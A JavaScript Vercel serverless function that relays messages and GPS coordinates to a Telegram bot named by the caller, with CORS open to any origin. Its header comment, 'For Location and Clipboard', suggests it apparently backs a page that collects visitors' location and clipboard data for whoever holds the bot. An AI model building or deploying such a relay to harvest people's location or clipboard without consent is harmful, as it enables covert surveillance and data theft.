// Vercel Serverless Function - /api/index3.js
// For Location and Clipboard

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            error: 'Method not allowed. Use POST.' 
        });
    }

    try {
        const { action, token, chat_id, message, latitude, longitude } = req.body;

        console.log('📥 Received:', { action, chat_id, hasToken: !!token });

        // Validate
        if (!token || !chat_id) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing token or chat_id' 
            });
        }

        if (!token.match(/^\d+:[A-Za-z0-9_-]+$/)) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid token format' 
            });
        }

        const baseUrl = `https://api.telegram.org/bot${token}`;

        // ===== SEND MESSAGE =====
        if (action === 'sendMessage') {
            if (!message) {
                return res.status(400).json({ 
                    success: false, 
                    error: 'Message required' 
                });
            }

            console.log('📤 Sending message...');
            
            const response = await fetch(`${baseUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();
            console.log('📥 Response:', result.ok);

            if (result.ok) {
                return res.status(200).json({ 
                    success: true, 
                    message: 'Message sent',
                    data: result 
                });
            } else {
                return res.status(400).json({ 
                    success: false, 
                    error: result.description 
                });
            }
        }

        // ===== SEND LOCATION =====
        if (action === 'sendLocation') {
            if (!latitude || !longitude) {
                return res.status(400).json({ 
                    success: false, 
                    error: 'Latitude and longitude required' 
                });
            }

            console.log('📍 Sending location...');
            
            const response = await fetch(`${baseUrl}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chat_id,
                    latitude: parseFloat(latitude),
                    longitude: parseFloat(longitude)
                })
            });

            const result = await response.json();
            console.log('📥 Response:', result.ok);

            if (result.ok) {
                return res.status(200).json({ 
                    success: true, 
                    message: 'Location sent',
                    data: result 
                });
            } else {
                return res.status(400).json({ 
                    success: false, 
                    error: result.description 
                });
            }
        }

        return res.status(400).json({ 
            success: false, 
            error: 'Invalid action' 
        });

    } catch (error) {
        console.error('❌ Server error:', error);
        return res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message
        });
    }
}